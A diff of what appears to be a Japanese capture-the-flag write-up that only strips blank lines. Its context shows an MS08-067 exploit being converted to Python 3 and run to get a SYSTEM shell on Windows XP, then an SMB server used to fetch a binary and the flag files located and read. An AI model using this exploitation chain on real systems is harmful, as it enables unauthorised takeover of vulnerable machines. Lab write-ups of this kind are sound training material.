@@ -75,7 +75,6 @@ PoCはPython2.x用ぽいので、`2to3-2.7`でPython3.x用に変換
            ^^^^^^^^^^^^^^
 SyntaxError: multiple exception types must be parenthesized
 
-
 └─$ 2to3-2.7 --no-diffs -w ms08_067_2018.py
 RefactoringTool: Skipping optional fixer: buffer
 RefactoringTool: Skipping optional fixer: idioms
@@ -84,7 +83,6 @@ RefactoringTool: Skipping optional fixer: ws_comma
 RefactoringTool: Refactored ms08_067_2018.py
 RefactoringTool: Files that were modified:
 RefactoringTool: ms08_067_2018.py
-
 
 └─$ python3.13 ms08_067_2018.py
 #######################################################################
@@ -191,9 +189,7 @@ windowsXPは`whoami`がないので、Kaliの`Whoami.exe`をsmbサーバ経由�
 └─$ plocate whoami.exe      
 /usr/share/windows-resources/binaries/whoami.exe
 
-
 └─$ cp /usr/share/windows-resources/binaries/whoami.exe .
-
 
 └─$ impacket-smbserver share .
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -215,7 +211,6 @@ NT AUTHORITY\SYSTEM
 C:\WINDOWS\system32>cd c:\
 cd c:\
 
-
 C:\>dir user.txt /s
 dir user.txt /s
  Volume in drive C has no label.
@@ -230,11 +225,9 @@ dir user.txt /s
                1 File(s)             32 bytes
                0 Dir(s)   6.400.479.232 bytes free
 
-
 C:\>type "C:\Documents and Settings\john\Desktop\user.txt"
 type "C:\Documents and Settings\john\Desktop\user.txt"
 e69af0e4f443de7e36876fda4ec7644f
-
 
 C:\>dir root.txt /s
 dir root.txt /s
@@ -249,7 +242,6 @@ dir root.txt /s
      Total Files Listed:
                1 File(s)             32 bytes
                0 Dir(s)   6.400.524.288 bytes free
-
 
 C:\>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
 type "C:\Documents and Settings\Administrator\Desktop\root.txt"
